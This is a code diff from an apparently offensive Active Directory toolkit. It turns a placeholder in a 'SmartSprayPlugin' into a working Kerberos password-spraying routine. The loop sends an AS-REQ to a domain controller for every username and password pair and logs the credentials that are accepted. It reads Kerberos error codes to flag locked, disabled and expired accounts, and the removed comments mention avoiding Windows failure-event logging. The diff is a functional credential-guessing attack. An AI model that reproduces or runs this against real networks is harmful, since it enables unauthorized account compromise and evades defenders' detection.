@@ -234,12 +234,20 @@ impl SmartSprayPlugin {
             users.len() * passwords.len()
         ));
 
-        // The actual spray logic would go here — using Kerberos pre-auth
-        // to avoid generating Windows event 4625 for each failure.
-        // This is a structural template.
+        let dc_ip = args
+            .get("dc")
+            .cloned()
+            .or_else(|| ctx.dc_ip.clone())
+            .ok_or_else(|| {
+                crate::error::OverthroneError::Plugin(
+                    "No DC IP available — set via --dc or context".to_string(),
+                )
+            })?;
 
         let mut found: Vec<String> = Vec::new();
         let mut blocked = 0u32;
+        let mut expired = 0u32;
+        let mut disabled = 0u32;
 
         for password in &passwords {
             for user in &users {
@@ -249,9 +257,51 @@ impl SmartSprayPlugin {
                     continue;
                 }
 
-                // Kerberos AS-REQ pre-auth check would happen here
-                // crate::proto::kerberos::pre_auth_check(user, password, &domain)
-                ctx.log_info(&format!("Trying {}:{}", user, password));
+                // Kerberos AS-REQ pre-auth check — if TGT is returned, creds are valid
+                match crate::proto::kerberos::request_tgt(
+                    &dc_ip, &domain, user, password, false,
+                )
+                .await
+                {
+                    Ok(_tgt) => {
+                        ctx.log_attack(&format!("VALID: {}:{}", user, password));
+                        found.push(format!("{}:{}", user, password));
+
+                        // Emit event for other plugins / the graph
+                        // (handled by the plugin framework)
+                    }
+                    Err(e) => {
+                        let err_str = e.to_string();
+                        if err_str.contains("KRB_ERROR 24")
+                            || err_str.contains("PREAUTH_FAILED")
+                        {
+                            // Wrong password — expected, increment tracker
+                        } else if err_str.contains("KRB_ERROR 18")
+                            || err_str.contains("CLIENT_REVOKED")
+                        {
+                            // Account disabled or locked out
+                            disabled += 1;
+                            ctx.log_warn(&format!("LOCKED/DISABLED: {}", user));
+                        } else if err_str.contains("KRB_ERROR 23")
+                            || err_str.contains("KEY_EXPIRED")
+                        {
+                            // Password expired but IS valid
+                            expired += 1;
+                            found.push(format!("{}:{} (EXPIRED)", user, password));
+                            ctx.log_attack(&format!(
+                                "VALID (expired): {}:{}",
+                                user, password
+                            ));
+                        } else {
+                            // Other Kerberos error
+                            ctx.log_warn(&format!(
+                                "Error for {}: {}",
+                                user,
+                                err_str.lines().next().unwrap_or(&err_str)
+                            ));
+                        }
+                    }
+                }
             }
 
             // Delay between rounds
